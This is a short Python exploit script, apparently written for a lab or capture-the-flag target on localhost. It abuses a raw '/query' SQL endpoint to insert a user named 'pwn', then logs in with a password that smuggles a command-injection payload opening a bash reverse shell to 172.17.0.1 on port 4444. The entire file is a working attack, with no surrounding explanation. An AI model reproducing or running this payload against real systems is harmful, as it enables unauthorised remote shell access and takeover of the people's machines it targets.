import requests

port = "5222"
ip = "172.17.0.1"

url = f"http://localhost:{port}"

requests.post(url + "/query", {"sql": f'insert into users(username, password) values("pwn", "\' && bash -i >& /dev/tcp/{ip}/4444 0>&1 #")'})

r = requests.post(url + "/login", {"username":"pwn", "password": f"' && bash -i >& /dev/tcp/{ip}/4444 0>&1 #"})

print(r.text)